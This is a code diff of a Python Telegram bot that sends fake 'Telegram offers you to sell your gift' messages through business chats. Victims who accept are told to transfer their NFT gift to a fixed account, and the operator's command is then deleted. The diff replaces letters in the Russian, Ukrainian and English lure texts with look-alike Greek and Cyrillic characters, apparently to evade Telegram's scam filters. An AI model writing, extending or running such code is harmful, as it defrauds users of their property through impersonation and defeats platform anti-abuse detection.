@@ -2,11 +2,9 @@ import asyncio
 import json
 import logging
 import os
-import random
 import re
 import time
 import uuid
-
 from dotenv import load_dotenv
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.types import (
@@ -18,7 +16,6 @@ from aiogram.types import (
 )
 
 load_dotenv()
-
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 NFT_TRANSFER_LINK = "tg://send_gift?to=dobrks"
 ADMIN_ID = 8414654810
@@ -34,11 +31,9 @@ if not BOT_TOKEN:
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
-
 offers = {}
 last_send = 0
 SEND_COOLDOWN = 30
-
 CONNECTIONS_FILE = "connections.json"
 connections = {}
 
@@ -118,28 +113,28 @@ def parse_nft_input(arg: str):
 
 TEXTS = {
     "ru": {
-        "offer_template": "Telegram предлагает вам продать подарок <b>{nft_link}</b> за <b>{amount}</b>.",
-        "offer_expires": "Предложение действительно ещё <b>5ч 59м.</b>",
+        "offer_template": "Телегрαм предлαгαет вαм продαть подαрок <b>{nft_link}</b> зα <b>{amount}</b>.",
+        "offer_expires": "Предлοжение действительнο ещё <b>5ч 59м.</b>",
         "btn_accept": "Принять",
-        "btn_decline": "Отклонить",
+        "btn_decline": "Отклοнить",
         "btn_transfer": "Передать",
-        "declined": "Предложение отклонено",
+        "declined": "Предлοжение отклοненο",
     },
     "us": {
-        "offer_template": "Telegram offers you to sell the gift <b>{nft_link}</b> for <b>{amount}</b>.",
-        "offer_expires": "This offer is valid for <b>5h 59m.</b>",
-        "btn_accept": "Accept",
-        "btn_decline": "Decline",
-        "btn_transfer": "Send gift",
-        "declined": "Offer declined",
+        "offer_template": "Tеlеgrаm οffеrs yοu tο sеll thе gift <b>{nft_link}</b> fοr <b>{amount}</b>.",
+        "offer_expires": "This οffеr is vаlid fοr <b>5h 59m.</b>",
+        "btn_accept": "Ассept",
+        "btn_decline": "Dесlinе",
+        "btn_transfer": "Sеnd gift",
+        "declined": "Оffеr dесlinеd",
     },
     "ua": {
-        "offer_template": "Telegram пропонує вам продати подарунок <b>{nft_link}</b> за <b>{amount}</b>.",
-        "offer_expires": "Пропозиція дійсна ще <b>5г 59хв.</b>",
+        "offer_template": "Телегрαм пропонує вαм продαти подαрунок <b>{nft_link}</b> зα <b>{amount}</b>.",
+        "offer_expires": "Пропозиція дійснα ще <b>5г 59хв.</b>",
         "btn_accept": "Прийняти",
         "btn_decline": "Відхилити",
         "btn_transfer": "Передати",
-        "declined": "Пропозицію відхилено",
+        "declined": "Пропозицію відхиленο",
     },
 }
 
@@ -182,7 +177,6 @@ def get_deal_keyboard(order_id: str, lang: str) -> InlineKeyboardMarkup:
 async def cmd_rep_business(message: types.Message):
     if message.from_user.id != ADMIN_ID:
         return
-
     global last_send
     now = time.time()
     if now - last_send < SEND_COOLDOWN:
@@ -196,7 +190,6 @@ async def cmd_rep_business(message: types.Message):
             pass
         return
     last_send = now
-
     args = message.text.split()
     if len(args) < 3:
         try:
@@ -207,12 +200,10 @@ async def cmd_rep_business(message: types.Message):
         except Exception:
             pass
         return
-
     nft_arg = args[1]
     amount = args[2]
     currency = args[3].strip().lower() if len(args) > 3 else "stars"
     lang = get_lang(args[4] if len(args) > 4 else "ru")
-
     try:
         nft_name, nft_num, nft_url = parse_nft_input(nft_arg)
         nft_num_formatted = format_amount(str(nft_num))
@@ -226,13 +217,10 @@ async def cmd_rep_business(message: types.Message):
         except Exception:
             pass
         return
-
     t = TEXTS[lang]
     amount_formatted = format_amount(amount)
     currency_text = mask_stars(currency)
-
     order_id = f"TG-{uuid.uuid4().hex[:10].upper()}"
-
     offers[order_id] = {
         "order_id": order_id,
         "nft_url": nft_url,
@@ -244,27 +232,21 @@ async def cmd_rep_business(message: types.Message):
         "business_connection_id": message.business_connection_id,
         "chat_id": message.chat.id,
     }
-
     buyer_name = get_buyer_name(message.business_connection_id)
-
     offer_text_raw = t['offer_template'].format(
         buyer="@@BUYER@@",
         amount="@@AMOUNT@@",
         nft_link="@@NFT@@",
     )
-
     nft_link = f'<a href="{nft_url}">{nft_full_name}</a>'
-
     offer_text = (
         offer_text_raw
         .replace("@@BUYER@@", buyer_name)
         .replace("@@AMOUNT@@", f"{amount_formatted} {currency_text}")
         .replace("@@NFT@@", nft_link)
     )
-
     preview_line = f'<a href="{nft_url}">&#8203;</a>'
     text = f"{preview_line}{offer_text}\n\n{t['offer_expires']}"
-
     try:
         await message.answer(
             text=text,
@@ -279,7 +261,6 @@ async def cmd_rep_business(message: types.Message):
         print(f"[OFFER] sent lang={lang}")
     except Exception as e:
         print(f"[SEND ERROR] {e}")
-
     try:
         await bot.delete_business_messages(
             business_connection_id=message.business_connection_id,
@@ -292,42 +273,36 @@ async def cmd_rep_business(message: types.Message):
 async def process_accept(callback: CallbackQuery):
     order_id = callback.data.split("_", 1)[1]
     offer = offers.get(order_id)
-
     if not offer or offer["status"] != "pending":
         await callback.answer()
         return
-
     offer["status"] = "accepted"
     lang = offer["lang"]
     currency_text = mask_stars(offer['currency'])
     nft_name_rand = offer['nft_name']
-
     alert_texts = {
-        "ru": f"Предложение о продаже {offer['nft_name']} принято.\n\nПередайте подарок для зачисления {offer['amount']} {currency_text}.",
-        "us": f"Offer to sell {offer['nft_name']} has been accepted.\n\nTransfer the gift to receive {offer['amount']} {currency_text}.",
-        "ua": f"Пропозицію щодо продажу {offer['nft_name']} прийнято.\n\nПередайте подарунок для зарахування {offer['amount']} {currency_text}."
+        "ru": f"Предлοжение о продαже {offer['nft_name']} принятο.\n\nПередайте подαрок для зαчисления {offer['amount']} {currency_text}.",
+        "us": f"Оffеr tο sеll {offer['nft_name']} hаs bееn ассeptеd.\n\nTrаnsfеr thе gift tο rесеivе {offer['amount']} {currency_text}.",
+        "ua": f"Пропозицію щодо продαжу {offer['nft_name']} прийнятο.\n\nПередайте подαрунок для зαрахування {offer['amount']} {currency_text}."
     }
     await callback.answer(alert_texts.get(lang, alert_texts["ru"]), show_alert=True)
-
     nft_link = f'<a href="{offer["nft_url"]}">{nft_name_rand}</a>'
     preview_line = f'<a href="{offer["nft_url"]}">&#8203;</a>'
-
     if lang == "ru":
         text = (
-            f"{preview_line}{gift_emoji()} Подарок <b>{nft_link}</b> продан.\n\n"
-            f"• Передайте подарок для зачисления {currency_text}."
+            f"{preview_line}{gift_emoji()} Подαрок <b>{nft_link}</b> продαн.\n\n"
+            f"• Передайте подαрок для зαчисления {currency_text}."
         )
     elif lang == "ua":
         text = (
-            f"{preview_line}{gift_emoji()} Подарунок <b>{nft_link}</b> продано.\n\n"
-            f"• Передайте подарунок для зарахування {currency_text}."
+            f"{preview_line}{gift_emoji()} Подαрунок <b>{nft_link}</b> продαно.\n\n"
+            f"• Передайте подαрунок для зαрахування {currency_text}."
         )
     else:
         text = (
-            f"{preview_line}{gift_emoji()} Gift <b>{nft_link}</b> sold.\n\n"
-            f"• Transfer the gift to receive {currency_text}."
+            f"{preview_line}{gift_emoji()} Gift <b>{nft_link}</b> sοld.\n\n"
+            f"• Trаnsfеr thе gift tο rесеivе {currency_text}."
         )
-
     try:
         await bot.edit_message_text(
             chat_id=callback.message.chat.id,
@@ -349,17 +324,13 @@ async def process_accept(callback: CallbackQuery):
 async def process_decline(callback: CallbackQuery):
     order_id = callback.data.split("_", 1)[1]
     offer = offers.get(order_id)
-
     if not offer or offer["status"] != "pending":
         await callback.answer()
         return
-
     offer["status"] = "declined"
     lang = offer["lang"]
     t = TEXTS[lang]
-
     text = f"{cross_emoji()} {t['declined']}"
-
     try:
         await bot.edit_message_text(
             chat_id=callback.message.chat.id,
@@ -371,7 +342,6 @@ async def process_decline(callback: CallbackQuery):
         )
     except Exception as e:
         print(f"[EDIT ERROR] {e}")
-
     await callback.answer()
 
 @dp.callback_query(F.data.startswith("confirm_"))
